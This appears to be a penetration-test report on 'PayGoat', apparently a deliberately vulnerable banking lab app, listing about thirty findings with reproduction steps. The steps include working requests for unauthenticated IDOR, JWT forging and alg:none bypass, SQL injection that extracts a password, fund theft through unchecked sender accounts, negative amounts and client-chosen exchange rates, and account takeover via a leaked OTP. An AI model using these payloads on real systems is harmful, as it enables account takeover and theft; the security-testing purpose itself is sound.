title: Broken Object Level Authorization (IDOR) in GET /user/profile/{userID} exposes all users incl. plaintext passwords
description: The profile endpoint requires NO authentication at all and applies no ownership check: GET /user/profile/{userID} with no Authorization header returns the complete profile of ANY user by simple integer enumeration (userID 1..N). Response includes the victim's plaintext password, USD/EUR account numbers, their UUIDs (usable in transfers), balances and phone number (usable for the OTP reset flow). userID 1 is the admin account 'superhacker'.
steps:
1. With NO Authorization header: curl http://paygoat-api:3000/user/profile/3 -> HTTP 200, bob's profile incl. "password":"..."
2. curl http://paygoat-api:3000/user/profile/1 -> returns admin 'superhacker' with plaintext password s3cureP@ssw0rd
3. Enumerate userID=2..N to dump every user
(with a token it behaves identically; the token is not needed)
evidence: GET /user/profile/1 with no Authorization header -> {"userID":1,"username":"superhacker",...,"password":"s3cureP@ssw0rd",...} (HTTP 200)

title: Broken function-level authorization: PUT /user/profile/{userID}/password allows changing ANY user's password (account takeover)
description: Any authenticated user can change the password of any other user by putting their userID in the path. No ownership or admin check. Enables full takeover of any account, including the administrator (userID 1).
steps:
1. Login as any user (e.g. alice, userID 2)
2. PUT http://paygoat-api:3000/user/profile/3/password with body {"password":"Pwned123!"} and the attacker's bearer token
3. Response: {"message":"Password updated successfully"}
4. POST /auth/login {"username":"bob","password":"Pwned123!"} -> 'Login successful' (attacker now owns bob's account)
evidence: PUT /user/profile/3/password as alice -> 'Password updated successfully'; bob logged in with attacker-chosen password

title: JWT signed with weak guessable secret 'secret' allows forging tokens for any user
description: Session tokens are HS256 JWTs whose signing secret is the word 'secret'. An attacker who captures any token can crack it offline in seconds and forge arbitrary tokens (e.g. admin userID 1) without credentials.
steps:
1. Capture any login token (POST /auth/login)
2. Brute-force HMAC secret offline with a small wordlist -> 'secret'
3. Craft JWT header {"alg":"HS256","typ":"JWT"}, payload {"userID":1,"username":"superhacker","iat":...,"exp":...}, sign HMAC-SHA256 with 'secret'
4. GET http://paygoat-api:3000/user/profile/2 with forged token -> HTTP 200 (served as admin)
evidence: artifacts/jwt_forge.py: 'CRACKED SECRET: secret' with forged token accepted 200

title: JWT algorithm 'alg:none' accepted - complete authentication bypass without any secret
description: The API accepts unsigned JWTs with alg=none (variants 'none','None','NONE'; trailing dot optional) as valid authentication. An attacker can mint admin tokens with zero credentials and zero captured material.
evidence: artifacts/jwt_none_test.py: multiple unsigned alg:none variants accepted (200)

title: Passwords stored and returned in plaintext (no hashing)
description: User passwords are stored unhashed in the SQLite users table and echoed back verbatim by profile endpoints (the profile JSON includes a 'password' field with the cleartext value).
steps:
1. POST /auth/register {"username":"dave",...,"password":"Passw0rd!23"}
2. GET http://paygoat-api:3000/user/profile/5 -> response contains "password":"Passw0rd!23" in plaintext
evidence: Profile JSON returns exact cleartext password set at registration

title: CORS misconfiguration: Access-Control-Allow-Origin/Methods/Headers '*' on all frontend and API responses
description: Every response from the SPA (:8000) and the API (:paygoat-api:3000) sets Access-Control-Allow-Origin: *, Access-Control-Allow-Methods: * and Access-Control-Allow-Headers: *. Combined with tokens in localStorage, any origin can consume the fully authenticated API surface from a victim's browser context if a token is ever exposed (and any site can read unauthenticated sensitive endpoints like /user/profile).
steps:
1. curl -i http://paygoat:8000/ -> headers include 'Access-Control-Allow-Origin: *', 'Access-Control-Allow-Methods: *', 'Access-Control-Allow-Headers: *'
2. Same headers on http://paygoat-api:3000/auth/login responses
evidence: artifacts/root_headers.txt + login responses show ACAO:*, ACAM:*, ACAH:*

title: Verbose SQLite errors disclose DBMS and schema in API responses
description: Database errors are returned to the client verbatim, disclosing the DBMS (SQLite), table names and column names (users.username NOT NULL / UNIQUE), aiding injection attacks.
steps:
1. POST http://paygoat-api:3000/auth/register with body {} and Content-Type: application/json -> 400 {"details":"SQLITE_CONSTRAINT: NOT NULL constraint failed: users.username"}
2. POST /auth/register {"username":"dave",...} -> {"details":"SQLITE_CONSTRAINT: UNIQUE constraint failed: users.username"}
evidence: Raw error strings returned in HTTP responses

title: SQL injection in /bank/transactions/history 'account' parameter (boolean-based blind + tautology)
description: The account query parameter is concatenated into the SQLite SELECT without quotes when it fails format validation, enabling SQL injection. Verified tautology returns every row of the transactions table, and arbitrary subqueries against any table (e.g. users) yield boolean true/false, allowing full blind exfiltration of the database.
steps:
1. Login as any user (e.g. eve) to get token
2. GET http://paygoat-api:3000/bank/transactions/history?account=0 OR 1=1  (URL-encode the space) -> HTTP 200 returns ALL transactions, not just the caller's
3. Boolean test: account=0 OR (SELECT substr(password,1,1) FROM users WHERE userID=1)='s' -> rows returned (true); same with ='z' -> {"transactions":[]} (false)
4. Errors also echo SQLite engine and query fragments, e.g. GET ...?account=USD28052344' -> {"error":"SQLITE_ERROR: near \"' OR u1.accountEUR = USD28052344'\": syntax error"}
evidence: '0 OR 1=1' dumped all 6 transaction rows; blind boolean oracle on users.password first char 's' = true (matches admin password s3cureP@ssw0rd). Raw outputs: artifacts/sqli_all.json artifacts/blind_true.json artifacts/blind_false.json

title: Missing ownership check on /bank/transactions/history allows reading any user's transaction history by account number
description: Even without injection, the endpoint validates only that a bearer token exists: the account parameter is not checked against the caller's accounts, so any authenticated user can list all transactions (sender/recipient IDs, counterpart accounts, amounts, timestamps) of any other account number. Account numbers are public via the unauthenticated profile IDOR.
steps:
1. GET http://paygoat-api:3000/user/profile/3 (no auth) -> victim accountUSD e.g. USD89023978
2. GET /bank/transactions/history?account=USD89023978 with attacker's own token -> HTTP 200 with victim's full transaction list
evidence: Alice (userID 2) retrieved bob's (userID 3) history for account USD89023978 (artifacts output in log)

title: Missing authentication on POST /bank/account discloses any user's account numbers and balances by userID
description: The endpoint returns the target user's USD/EUR account numbers and current balances based solely on the userID body parameter; no Authorization header is required. (Artifacts: HTTP 200 without token.)
steps:
1. POST http://paygoat-api:3000/bank/account with body {"userID":3} and NO Authorization header
2. HTTP 200: {"message":"Account data retrieved successfully","data":{"accountUSD":"USD89023978","balanceUSD":55,"accountEUR":"EUR75123654","balanceEUR":-90}}
evidence: 200 OK without token; arbitrary userID enumeration works

title: /payment/transfer does not verify senderAccountNumber belongs to the caller - arbitrary fund theft
description: Any authenticated user can debit ANY account by supplying its number as senderAccountNumber. Ownership of the sender is never checked against the JWT. Only 'insufficient funds' blocks the theft.
evidence: bob USD 70 after attacker-initiated 20 debit (verified via GET /user/profile/3)

title: /payment/transferthirdparties lacks sender ownership check - debit arbitrary accounts
description: Same missing control on the external-transfer endpoint: senderAccountNumber is trusted from the request body. Demonstrated stealing 60 USD from bob's account using alice's token.
steps:
1. POST /payment/transferthirdparties with attacker token: {"senderAccountNumber":"USD89023978","recipientAccountNumber":"USD28052344","amount":60}
2. {"message":"Transfer successful"}; victim balance -60, attacker +60
evidence: alice +60 / bob -60 observed in profile balances immediately after call

title: /payment/transferFundsUuid lacks sender ownership check via accountUSD parameter
description: UUID-based transfer trusts the accountUSD body parameter for the debit account. With any valid token an attacker can set accountUSD to a victim account (public via unauthenticated profile) and move funds out, resolved via recipientUUID.
steps:
1. POST /payment/transferFundsUuid with attacker token: {"accountUSD":"USD89023978","recipientUUID":"<uuid from profile>","amount":15}
2. {"message":"USD transfer completed","fromAccount":"USD89023978",...}; victim lost 15 USD
evidence: bob USD dropped 55 -> 40 region (15 debited) by eve/alice-initiated transfer

title: Negative amount accepted by transfer endpoints - creates funds and debits recipients (financial logic flaw)
description: /payment/transfer and /payment/transferthirdparties accept negative amounts. A negative 'transfer' credits the sender and debits/creates balance elsewhere, allowing money out of thin air (recipient balances can go negative).
steps:
1. POST /payment/transfer with own token: {"senderAccountNumber":"<own USD>","recipientAccountNumber":"<victim USD>","amount":-100,"currencyFrom":"USD","currencyTo":"EUR","rate":1} -> 'Transfer successful'; own balance +100, victim's EUR -100
2. POST /payment/transferthirdparties {"senderAccountNumber":"<victim USD>","recipientAccountNumber":"<own USD>","amount":-77} -> victim USD +77 (money creation), own USD -77 (debit abuse)
evidence: Balances before/after captured: sender USD 90->190 on amount -100; EUR -50 created; server never rejects amount<0

title: Client-controlled exchange 'rate' in /payment/transfer allows arbitrary currency conversion (money laundering at self-chosen price)
description: The FX rate is read from the request body (the UI even hardcodes rate=1). Sending 1 USD with rate=1000 debits 1 USD and credits 1000 EUR to the recipient - free unlimited money multiplication between a user's own accounts.
steps:
1. POST /payment/transfer with own token: {"senderAccountNumber":"<own USD>","recipientAccountNumber":"<own USD>","amount":1,"currencyFrom":"USD","currencyTo":"EUR","rate":1000}
2. 'Transfer successful'; own USD -1, own EUR +1000 (observed alice EUR -50 -> 950 with USD only -1)
evidence: 1 USD converted into 1000 EUR with attacker-supplied rate=1000

title: /payment/register-alias writes aliases into ANY user's recipient list via userID parameter
description: The alias registration trusts the userID from the body (no binding to the token), so an attacker can plant attacker-controlled recipients (alias -> attacker account UUID) inside other users' saved recipients, enabling transfer fraud against those users.
evidence: bob's (userID 3) recipients contained {"alias":"hijack","uuid":"8f7e0cc8-..."} pointing at alice's account

title: /payment/saved-recipients userID parameter IDOR - read any user's saved recipients
description: saved-recipients returns the recipient list of whatever userID is passed in the query string, regardless of the token owner, exposing other users' saved payee UUIDs (which can be targeted by transferFundsUuid).
steps: 1. GET /payment/saved-recipients?userID=3 with attacker token -> victim list returned
evidence: eve/alice tokens read userID=3's recipients (artifacts/eve_token.txt used)

title: /bank/loan/request creates approved, funded loans for ANY user via userID parameter
description: Loans are auto-approved and deposited instantly with no ownership check on the userID body parameter and no credit rules. An attacker can take loans out in another user's name (funds land in the victim's account but the victim carries debt) or repeat loans for themselves unlimited.
steps:
1. POST /bank/loan/request with attacker token: {"userID":3,"amount":500} -> 'Loan approved and deposited', loan stored under victim: GET /bank/loan/user?userID=3 shows {"loanID":1,"userID":3,...}
2. Same call with own userID repeated in the same second -> two additional 600 USD loans approved back-to-back (balance 264 -> 864 -> 1464)
evidence: loanID 1 created for userID 3 by alice token; alice stacked loanID 2 and 3 instantly (artifacts logged)

title: /bank/loan/request auto-approves unlimited repeated loans with no cooldown or total cap
description: The loan engine instantly approves every request within 100..600 USD regardless of existing loans, income or balance: an attacker can stack unlimited loans (observed 2 x 600 USD granted in the same second), inflating their balance arbitrarily; per-request cap is the only control.
steps:
1. POST /bank/loan/request {"userID":<own>,"amount":600} twice in a row -> both 'Loan approved and deposited'; nuevoSaldo 864 then 1464
2. GET /bank/loan/user?userID=<own> lists both loans with status approved
evidence: alice/eve account reached USD 1464 from initial 100 via instant repeated loans

title: /bank/loan/user userID parameter IDOR - read any user's loans
description: Loans of any user are returned for the userID given in the query string; token owner is never compared, exposing other users' loan records.
steps: 1. GET /bank/loan/user?userID=3 with attacker token -> victim loans listed (loanID 1, amount 500, approved)
evidence: bob's loan record visible to eve/alice token

title: /support/conversation/{id}/comments missing conversation ownership check (read others' tickets + post comments)
description: BOLA on support tickets: any authenticated user can read the full content of any conversation by numeric ID (including the seeded admin ticket #1) and can post comments into other users' conversations by ID.
steps:
1. GET /support/conversation/1/comments with low-priv token -> admin 'Secret Ticket' content + comment returned
2. GET /support/conversation/3/comments -> victim's ticket 'Bobs secret'
3. POST /support/conversation/3/comment {"comment":"alice was here in bob ticket"} with attacker token -> 'Comment added'
evidence: Conversation id=1 (userID 1 superhacker) and id=3 (userID 3) served to eve; comment id=3 created by eve

title: /otp/send returns the one-time password directly in the HTTP response body (no authentication required)
description: The OTP used for password reset is generated and echoed back in the JSON response (4 digits, e.g. "otp":"6271"), and the endpoint requires no authentication. Combined with the unauthenticated profile IDOR (which leaks every user's phoneNumber) this yields instant account takeover of any account, including superhacker. No rate limit: 8 consecutive OTP requests all returned 200.
steps:
1. GET /user/profile/1 (no auth) -> admin phoneNumber +544198261971
2. POST /otp/send {"phoneNumber":"+540384607605"} -> {"message":"OTP generated successfully","otp":"6271"}
3. POST /user/reset-password {"phoneNumber":"+540384607605","otp":"6271","newPassword":"Own3dByOTP!"} -> 'Password updated successfully'
4. POST /auth/login bob / Own3dByOTP! -> 'Login successful' (full ATO without any prior access)
evidence: End-to-end takeover of test user bob executed twice with response-leaked OTPs (see pentest_log/artifacts)

title: /user/reset-password recovery is identifier-only (phone number), with short OTP and no attempt throttling
description: The reset endpoint accepts phoneNumber + OTP without any session and the OTP is only 4 digits; wrong OTP attempts are not rate-limited or locked (multiple consecutive invalid attempts all answered 'Invalid OTP'), so recovery is guessable/brute-forceable even without the /otp/send leak.
steps:
1. POST /user/reset-password {"phoneNumber":"<victim>","otp":"9999","newPassword":"..."} -> 'Invalid OTP'
2. Repeat 0000/1111/2222 -> all 'Invalid OTP', no lockout, no captcha, no token required
3. Correct OTP -> 'Password updated successfully' (no prior authentication or confirmation step)
evidence: Unauthenticated successful reset of bob's password using leaked 4-digit OTP; zero failed-attempt throttling observed

title: Hardcoded AES-CBC key/IV in frontend enables retrieving ANY user's credit card via /bank/get-credit-card
description: The credit-card feature encrypts the target userID client-side with AES-256-CBC using a key ('0123456789abcabcdefdef0123456789') and IV ('abc9876543210def') hardcoded in bundle.js, and the server decrypts it without binding it to the session. Any user can craft ciphertext for another userID and receive that victim's full card data (PAN, CVV, expiry) encrypted with the same public key. Verified pulling bob's (userID 3) and admin's (userID 1) cards using eve's token.
evidence: PAN/CVV of userID 1 and 3 decrypted with hardcoded client key (see artifacts/credit_card_* entries in log)

title: Username enumeration via distinct /auth/login error messages
description: Login responds 'User not found' for unknown usernames and 'Incorrect password' for existing ones, letting attackers build a valid username list (and pair it with credential attacks).
steps:
1. POST /auth/login {"username":"ghost","password":"x"} -> {"error":"User not found"}
2. POST /auth/login {"username":"dave","password":"bad"} -> {"error":"Incorrect password"}
evidence: Two different error strings for invalid vs valid username

title: JWT sessions are not invalidated when a password is changed or reset
description: After a successful password change (/user/profile/{id}/password or /user/reset-password), previously issued JWTs remain valid until natural expiry (1h). A stolen token survives the remediation, and a victim taking back their account does not evict the attacker.
steps:
1. Capture bob's token T (artifacts/bob_token.txt)
2. Change bob's password via PUT /user/profile/3/password (or OTP reset)
3. GET /user/profile/3 with Authorization: Bearer T -> HTTP 200, still authenticated as bob
evidence: Old bob token returned 200 after two password resets

title: Production served as CRA development build: full application source, source maps and webpack HMR WebSocket exposed
description: The app on :8000 is a webpack dev-server style build: /static/js/bundle.js contains every src component's full source (API base URL, hardcoded crypto key, routes), /static/js/bundle.js.map (2.6 MB) is publicly downloadable, and a WebSocket /ws replies with HMR/hot-reload control messages ({"type":"hot"}, error overlay data). This hands attackers the exact design of all trust boundaries above. (The hardcoded card crypto key came solely from this leak.)
steps:
1. GET http://paygoat:8000/static/js/bundle.js -> 2.6 MB, contains '/usr/src/app/src/components/...' sources incl. AES key '0123456789abcabcdefdef0123456789'
2. GET http://paygoat:8000/static/js/bundle.js.map -> 200 OK, 2659944 bytes
3. WebSocket upgrade GET /ws -> 101 Switching Protocols, server pushes {"type":"hot"}/{'type':'liveReload'} JSON frames
evidence: artifacts/bundle.js artifacts/api.js; map 200 OK 2.6MB; /ws 101 upgrade captured

title: Broken object-level authorization on PUT /user/profile/{userID} - edit any user's profile
description: Any authenticated user can overwrite another user's firstname/lastname (profile identity fields) by placing the victim's userID in the path; no ownership check. Distinct endpoint from the password-change BOLA.
steps:
1. Login as eve (token)
2. PUT http://paygoat-api:3000/user/profile/5 -H 'Authorization: Bearer <eve_token>' -H 'Content-Type: application/json' -d '{"firstname":"Hacked","lastname":"Pwned"}'
3. {"message":"Profile updated successfully"}; GET /user/profile/5 now shows dave renamed to Hacked/Pwned
evidence: dave (userID 5) firstname changed to 'Hacked' by eve token (verified in profile response)

title: No rate limiting / lockout on /auth/login password guessing
description: Failed logins are answered identically (401 'Incorrect password') without throttling, lockout, captcha or delay - 12 consecutive wrong passwords all processed, enabling unlimited credential brute-forcing (hydra-ready), amplified by 'User not found'/'Incorrect password' enumeration.
steps:
1. POST /auth/login {"username":"dave","password":"wrongN"} 12 times
2. All 12 return HTTP 401 with no lockout or exponential delay
evidence: 12x 401 responses, no throttling header/behavior (log entries 2026-10-13T14:4x)

title: No password complexity policy at registration (password '123' accepted)
description: /auth/register accepts trivially weak passwords (e.g. '123') with no length/complexity validation, lowering the bar for credential attacks against the banking app.
steps:
1. POST /auth/register {"username":"weaky","firstname":"W","lastname":"P","password":"123"} -> 'User registered successfully' (userID 7)
2. POST /auth/login {"username":"weaky","password":"123"} -> 'Login successful'
evidence: password '123' registered and usable
